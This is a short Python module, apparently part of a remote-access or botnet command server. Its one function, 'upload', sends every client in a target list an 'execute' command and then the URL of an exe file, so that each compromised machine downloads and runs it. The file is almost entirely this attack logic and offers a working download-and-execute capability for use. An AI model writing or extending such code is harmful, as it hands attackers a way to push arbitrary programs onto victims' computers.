import config


def upload(server, url):
    """
    This would send a download link to the client to execute and run.
    :param server: Server socket object
    :param url: URL of the exe file
    """
    for target in config.targets:
        config.send_to_client(server, target, 'execute', response=False)
    for target in config.targets:
        config.send_to_client(server, target, url, response=False)
